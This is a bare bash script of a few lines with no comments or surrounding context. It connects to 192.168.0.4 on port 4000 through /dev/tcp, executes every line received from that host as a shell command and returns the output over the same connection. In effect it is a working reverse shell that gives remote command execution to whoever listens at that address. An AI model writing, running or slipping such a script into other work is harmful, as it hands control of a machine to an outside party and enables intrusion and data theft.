#!/bin/bash

server=192.168.0.4
port=4000

exec 3<>/dev/tcp/$server/$port
cat <&3 | while read line
do $line 2>&3 >&3
done

